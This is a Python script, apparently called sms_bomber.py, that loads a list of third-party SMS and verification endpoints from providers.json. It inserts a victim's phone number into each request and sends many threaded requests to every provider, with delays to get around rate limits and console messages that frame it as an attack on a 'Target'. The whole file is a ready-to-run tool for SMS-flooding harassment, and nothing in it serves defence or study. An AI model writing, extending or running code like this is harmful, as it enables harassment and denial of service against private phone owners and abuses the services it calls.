#!/usr/bin/env python3
import json
import threading
import requests
import time
import sys

# ------------------------------------------------------------
# Configuration
# ------------------------------------------------------------
PROVIDERS_FILE = "providers.json"
DEFAULT_REPEAT = 5
REQUEST_TIMEOUT = 10
DELAY_BETWEEN_REQUESTS = 0.5  # seconds

# ------------------------------------------------------------
# Helper Functions
# ------------------------------------------------------------
def replace_phonenumber(phone, data):
    """Replace all occurrences of the placeholder with the actual phone number."""
    return data.replace("Replace phonenumber here", phone)

def load_providers(phone):
    """Load providers.json, replace placeholder, and parse JSON."""
    try:
        with open(PROVIDERS_FILE, "r") as f:
            raw = f.read()
        processed = replace_phonenumber(phone, raw)
        return json.loads(processed)
    except Exception as e:
        print(f"❌ Error loading providers: {e}")
        sys.exit(1)

# ------------------------------------------------------------
# Sending Logic
# ------------------------------------------------------------
def send_message(phone, provider_name, provider_info, repeat_count):
    """
    Send requests to a single provider `repeat_count` times.
    """
    method = provider_info.get("method", "post").lower()
    url = provider_info.get("url")
    parameters = provider_info.get("parameters", {})
    headers = provider_info.get("headers", {})
    identifier = provider_info.get("identifier", "")

    # If parameters are strings, they already have the phone replaced.
    # But we also need to handle nested structures (e.g., lists).
    # The current replacement is done globally in the JSON string,
    # so parameters are already processed.

    for i in range(repeat_count):
        try:
            # Prepare the request
            if method == "post":
                # If parameters is a dict, send as JSON (most common)
                # If it's a string (form data), we'd need to handle differently.
                # Here we assume JSON for simplicity.
                response = requests.post(
                    url,
                    json=parameters,
                    headers=headers,
                    timeout=REQUEST_TIMEOUT
                )
            elif method == "get":
                response = requests.get(
                    url,
                    params=parameters,
                    headers=headers,
                    timeout=REQUEST_TIMEOUT
                )
            else:
                print(f"⚠️ {provider_name}: Unsupported method '{method}'")
                continue

            # Check status and identifier
            if response.status_code == 200 and identifier in response.text:
                print(f"✅ {provider_name} => Attempt {i+1}: SUCCESS")
            else:
                print(f"❌ {provider_name} => Attempt {i+1}: FAILED (HTTP {response.status_code})")
                # Optional: print snippet of response for debugging
                # print(response.text[:200])

        except requests.exceptions.Timeout:
            print(f"⏱️ {provider_name} => Attempt {i+1}: TIMEOUT")
        except requests.exceptions.ConnectionError:
            print(f"🔌 {provider_name} => Attempt {i+1}: CONNECTION ERROR")
        except Exception as e:
            print(f"⚠️ {provider_name} => Attempt {i+1}: ERROR - {str(e)}")

        # Delay to avoid rate limiting
        time.sleep(DELAY_BETWEEN_REQUESTS)

# ------------------------------------------------------------
# Main Attack Orchestrator
# ------------------------------------------------------------
def start_attack(phone, repeat_count=DEFAULT_REPEAT):
    """
    Load providers and launch threads for each provider.
    """
    providers = load_providers(phone)
    if not providers:
        print("❌ No providers found.")
        return

    print(f"📱 Target: {phone}")
    print(f"🔁 Repeat count per provider: {repeat_count}")
    print(f"📦 Total providers: {len(providers)}")
    print(f"📊 Total requests: {len(providers) * repeat_count}\n")

    threads = []
    for provider_name, provider_info in providers.items():
        t = threading.Thread(
            target=send_message,
            args=(phone, provider_name, provider_info, repeat_count)
        )
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("\n✅ Attack finished.")

# ------------------------------------------------------------
# Entry Point
# ------------------------------------------------------------
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python sms_bomber.py <phone_number> [repeat_count]")
        print("Example: python sms_bomber.py +966501234567 3")
        sys.exit(1)

    phone = sys.argv[1]
    repeat = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_REPEAT

    start_attack(phone, repeat)
